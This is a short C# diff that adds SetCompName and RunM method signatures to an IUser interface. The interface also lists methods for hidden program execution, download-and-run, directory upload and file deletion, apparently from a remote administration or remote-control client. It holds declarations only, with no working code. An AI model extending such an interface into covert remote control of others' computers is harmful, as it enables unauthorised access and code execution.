@@ -8,6 +8,7 @@ namespace Interfaces.Users
 {
     public interface IUser
     {
+        void SetCompName(string newName);
         void UploadDirectory(string dirPath, string uploadPath);
         List<string> GetLog();
         IInfoDevice GetInfoDevice();
@@ -19,6 +20,7 @@ namespace Interfaces.Users
         void DownloadUpdate();
         void Reconnect();
         void Disconnect();
+        void RunM(string file, string args);
         void RunHideProgram(string file);
         void DownloadAndRun(string file);
         void DeleteFile(string file);
